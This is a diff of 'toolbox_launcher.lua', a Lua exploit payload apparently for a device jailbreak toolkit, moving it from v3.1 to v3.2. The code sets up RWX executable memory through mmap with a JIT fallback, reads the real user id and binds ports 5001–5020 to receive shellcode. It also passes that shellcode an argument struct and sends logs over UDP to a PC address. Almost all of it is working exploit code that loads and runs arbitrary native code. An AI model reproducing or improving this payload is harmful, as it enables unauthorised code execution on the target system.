@@ -1,24 +1,6 @@
+-- SPDX-License-Identifier: MIT
 --[[
-  toolbox_launcher.lua — Luac0re payload for LuaC0re Toolbox (v3.1)
-
-  v3.1:
-    - Fixed: PC_IP placeholder was being replaced BOTH in the declaration
-      and in the HAVE_LOGS check, causing logs to silently disable.
-      The check now uses a regex that matches a valid IPv4 pattern.
-    - Python now only replaces the exact declaration line.
-
-  v3:
-    - PC_IP is no longer hardcoded.  The Python launcher detects the
-      host's LAN IP and substitutes the placeholder just before sending.
-      If left unsubstituted the payload simply skips UDP logging.
-    - Everything else unchanged: real user id lookup, two-stage memory
-      strategy (mmap -> JIT fallback), shellcode port scan.
-
-  Two-stage memory strategy:
-    1. mmap(PROT_RWX, 1 MB)     <- primary
-    2. JIT with sizes >= 512 KB <- fallback
-
-  Dynamic shellcode port scan 5001..5020.
+  toolbox_launcher.lua — Luac0re payload for LuaC0re Toolbox (v3.2)
 ]]
 
 local PC_IP        = "__PC_IP__"
@@ -26,8 +8,6 @@ local LOG_PORT     = 9027
 local SC_PORT_BASE = 5001
 local SC_PORT_MAX  = 5020
 
--- Enable logging only if PC_IP is a real IPv4 address.
--- Using a regex here so it survives any substitution path.
 local HAVE_LOGS = (PC_IP:match("^%d+%.%d+%.%d+%.%d+$") ~= nil)
 
 init_dlsym()
@@ -47,12 +27,12 @@ local function make_sockaddr_in(port, ip)
     return sa
 end
 
-local log_sock = -1
+-- Always create a valid socket so log_sock >= 0 inside ext_args
+local log_sock = create_socket(AF_INET, SOCK_DGRAM, 0)
 local log_sa   = nil
 
 if HAVE_LOGS then
-    log_sock = create_socket(AF_INET, SOCK_DGRAM, 0)
-    log_sa   = make_sockaddr_in(LOG_PORT, PC_IP)
+    log_sa = make_sockaddr_in(LOG_PORT, PC_IP)
 end
 
 local function ulog(m)
@@ -62,8 +42,7 @@ local function ulog(m)
 end
 
 if HAVE_LOGS then
-    ulog("toolbox_launcher: starting v3.1 (logs -> " .. PC_IP .. ":" ..
-         tostring(LOG_PORT) .. ")")
+    ulog("toolbox_launcher: starting v3.2 (logs -> " .. PC_IP .. ":" .. tostring(LOG_PORT) .. ")")
 end
 
 -- ============================================================
@@ -88,8 +67,7 @@ do
             write32(uid_buf, 0)
             local r = func_wrap(getInit)(uid_buf)
             real_uid = read32(uid_buf)
-            ulog("GetInitialUser ret=" .. tostring(r) ..
-                 " uid=" .. tostring(real_uid))
+            ulog("GetInitialUser ret=" .. tostring(r) .. " uid=" .. tostring(real_uid))
         end
     end
 end
@@ -109,7 +87,7 @@ do
     local PROT_RWX      = 0x7
     local MAP_PRIV_ANON = 0x1002
     local m = syscall.mmap(0, SC_TARGET, PROT_RWX, MAP_PRIV_ANON, -1, 0)
-    ulog("mmap RWX 1MB -> 0x" .. string.format("%x", m))
+    ulog("mmap RWX 1MB -> 0x" .. string.format("%x", m or 0))
     if m and m > 0x10000 then
         rw = m; rx = m
         ulog("PRIMARY mmap RWX at 0x" .. string.format("%x", m))
@@ -150,8 +128,7 @@ if rw == 0 then
         if r ~= 0 then
             rw, rx = r, x
             SC_SIZE = size
-            ulog("JIT ok at 0x" .. string.format("%x", r) ..
-                 " size 0x" .. string.format("%x", size))
+            ulog("JIT ok at 0x" .. string.format("%x", r) .. " size 0x" .. string.format("%x", size))
             break
         end
     end
@@ -204,8 +181,7 @@ local function receive_shellcode(dest, srv_fd, max_size)
         local n = syscall.read(cfd, dest + total, max_size - total)
         if n == 0 then break end
         if n < 0 then
-            err_msg = "read error " .. tostring(n) ..
-                      " at offset " .. tostring(total)
+            err_msg = "read error " .. tostring(n) .. " at offset " .. tostring(total)
             break
         end
         total = total + n
@@ -223,22 +199,14 @@ if n < 0x4000 then
 end
 
 -- ============================================================
--- ext_args
---   +0x00 s64 status
---   +0x08 s64 step
---   +0x10 u32 frame_count
---   +0x14 u32 _pad
---   +0x18 s32 log_fd       (-1 => no logging)
---   +0x1C s32 pad_fd
---   +0x20 u8  log_addr[16]
---   +0x30 u64 dbg[0]       (= real initial user id)
+-- ext_args layout
 -- ============================================================
 ulog("userId passed to shellcode = " .. tostring(real_uid))
 
 local ext = malloc(0x80)
 memset(ext, 0, 0x80)
 write64(ext + 0x00, 0xDEAD)
-write32(ext + 0x18, log_sock)   -- -1 if logs disabled
+write32(ext + 0x18, log_sock)   -- Valid socket file descriptor
 write32(ext + 0x1C, -1)
 if log_sa then
     for i = 0, 15 do write8(ext + 0x20 + i, read8(log_sa + i)) end
